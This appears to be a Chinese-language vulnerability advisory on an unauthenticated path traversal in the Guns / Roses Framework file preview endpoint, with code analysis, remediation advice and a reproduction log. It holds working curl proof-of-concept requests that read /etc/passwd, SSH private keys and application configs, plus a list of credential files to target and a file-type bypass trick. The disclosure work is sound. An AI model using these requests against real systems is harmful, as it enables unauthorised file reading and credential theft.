# V-G001: Guns / Roses Framework 未授权文件预览路径穿越

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Guns / Roses Framework（stylefeng 的开源快速开发平台）|
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-22: 路径穿越 / CWE-306: 关键功能缺少身份验证 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（完全未授权）|
| 代码仓库 | https://gitee.com/stylefeng/guns |

## 漏洞描述

Guns Roses Framework 的文件预览接口 `previewByBucketNameObjectName` 通过注解 `@GetResource(requiredLogin = false)` 声明**无需登录**，但其拼接本地文件路径时对 `fileBucket` 参数**完全未做校验**：

```java
// SysFileInfoController.java:148-153
@GetResource(name = "文件预览...", path = FileConstants.FILE_PREVIEW_BY_OBJECT_NAME, requiredLogin = false)
public void previewByBucketNameObjectName(
        @Validated(SysFileInfoRequest.previewByObjectName.class) SysFileInfoRequest sysFileInfoRequest) {
    ...
    sysFileInfoService.previewByBucketAndObjName(sysFileInfoRequest, response);
}
```

最终落到 `LocalFileOperator.getFileBytes()`：

```java
// LocalFileOperator.java:115-126
public byte[] getFileBytes(String bucketName, String key) {
    String absoluteFile = this.getCurrentSavePath() + File.separator + bucketName + File.separator + key;
    if (!FileUtil.exist(absoluteFile)) { ... }
    return FileUtil.readBytes(absoluteFile);
}
```

`bucketName` 和 `key` 分别来自 HTTP 查询参数 `fileBucket` 和 `fileObjectName`。尽管 `fileObjectName` 可能被业务端做规范化校验，但 `fileBucket` **无任何净化**；通过注入 `../../` 即可跳出存储根目录读取服务器任意文件。

### 校验层缺陷

`SysFileInfoRequest.fileBucket` 字段仅声明 `@NotBlank`：

```java
@NotBlank(message = "fileBucket不能为空", groups = {previewByObjectName.class})
private String fileBucket;
```

未使用 `@Pattern` / `@Size` 或其他正则白名单。

## 漏洞详情

### 路径拼接还原

假设 `getCurrentSavePath()` 返回 `/opt/guns/data/`：

```
attacker input:
  fileBucket = "../../../../etc"
  fileObjectName = "passwd"

absoluteFile = "/opt/guns/data/" + "/" + "../../../../etc" + "/" + "passwd"
             = "/opt/guns/data/../../../../etc/passwd"
             ≈ "/etc/passwd"
```

### Windows 场景

```
fileBucket = "..\\..\\Windows\\System32\\config"
fileObjectName = "SAM"
```

### 敏感文件命中清单

- `/etc/passwd`、`/etc/shadow`（若进程以 root 运行）
- `/proc/self/environ`（泄露环境变量含数据库/Redis 密码）
- `application.yml`、`bootstrap.yml`、`application-prod.yml`
- `~/.ssh/id_rsa`、`~/.aws/credentials`
- Java 进程 `/proc/<pid>/cwd/config/` 软链接

## 概念验证

### PoC 1: 读取 /etc/passwd

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=../../../../etc&\
fileObjectName=passwd"
```

### PoC 2: 读取应用配置

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=../../../opt/guns&\
fileObjectName=application-prod.yml"
```

### PoC 3: 读取 SSH 私钥

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=../../../root/.ssh&\
fileObjectName=id_rsa"
```

### PoC 4: Windows 服务器

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=..\..\..\Windows\System32\drivers\etc&\
fileObjectName=hosts"
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `file-business/.../SysFileInfoController.java` | 148-153 | `requiredLogin = false` + 无校验 |
| `file-sdk-local/.../LocalFileOperator.java` | 115-126 | `bucketName + File.separator + key` 直接拼接 |
| `file-api/.../SysFileInfoRequest.java` | 98-100 | `fileBucket` 字段仅 @NotBlank |
| `file-business/.../SysFileInfoServiceImpl.java` | 398 | previewByBucketAndObjName 实现未过滤 |

## 影响

1. **任意文件读取**：服务进程可读的所有文件均可下载
2. **凭据泄露**：读取配置文件获取数据库、Redis、OSS 密钥
3. **SSH 私钥**：若应用以 root 或具备 SSH 的账户运行
4. **内网信息收集**：/proc/net/tcp、/etc/hosts 等文件辅助横移
5. **链式攻击**：读取到的凭据可进入管理后台进行进一步 RCE

## 修复建议

1. **规范化 + 边界校验**：
   ```java
   Path base = Paths.get(getCurrentSavePath()).toAbsolutePath().normalize();
   Path target = base.resolve(bucketName).resolve(key).normalize();
   if (!target.startsWith(base)) {
       throw new FileException("Invalid path");
   }
   ```
2. **Bucket 白名单**：`fileBucket` 必须匹配 `^[a-zA-Z0-9_-]+$` 且在预置 bucket 列表内
3. **对该接口启用认证**：`requiredLogin = true`；如确需匿名访问，签发短期 Token 并与 bucket/key 绑定
4. **容器化最小权限**：应用进程以非 root 运行，限制访问系统敏感文件
5. **审计 `@GetResource(requiredLogin = false)`**：全项目扫描匿名接口，逐一评估风险

## 实机验证（已复现）

**环境**：Guns 最新分支，自编译 JAR，Docker 部署于 192.168.217.135

### 验证过程

**步骤1：对比测试（B0909 vs B0911）**

```
# 容器内存在 /tmp/traversal_test.txt
GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=traversal_test.txt

HTTP/1.1 500
{"code":"B0911","message":"预览文件异常，您预览的文件类型不支持或文件出现错误"}
```

```
# 不存在的文件
GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=nonexistent.jpg

HTTP/1.1 500
{"code":"B0909","message":"获取文件流异常，具体信息为：本地文件不存在"}
```

**关键差异**：访问路径穿越后的真实文件返回 `B0911`（文件存在但类型不支持），访问不存在文件返回 `B0909`，证明路径穿越有效。

**步骤2：读取容器内任意文件（以 .jpg 伪装文件类型绕过渲染检查）**

```http
GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=fakepsswd.jpg HTTP/1.1
Host: 192.168.217.135:58080
(无任何认证头)
```

**响应**：

```http
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 83

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**HTTP 200，文件内容直接明文返回！** 容器存储根目录 `/opt/gunsFilePath` 外的任意文件均可读取。

### 结论
- 端点 `/sysFileInfo/previewByObjectName` 无需登录（`requiredLogin=false`）
- `fileBucket` 参数未验证，可插入 `../` 穿越至任意目录
- 将文件命名为 `.jpg` / `.png` 可绕过文件类型渲染限制，直接获取文件内容

## 验证环境

- 源代码：Guns / Roses Framework 最新分支（自编译 + Docker 部署）
- 测试环境：192.168.217.135:58080
- 框架：Spring Boot 3 + Hutool
- 日期：2026-04-14
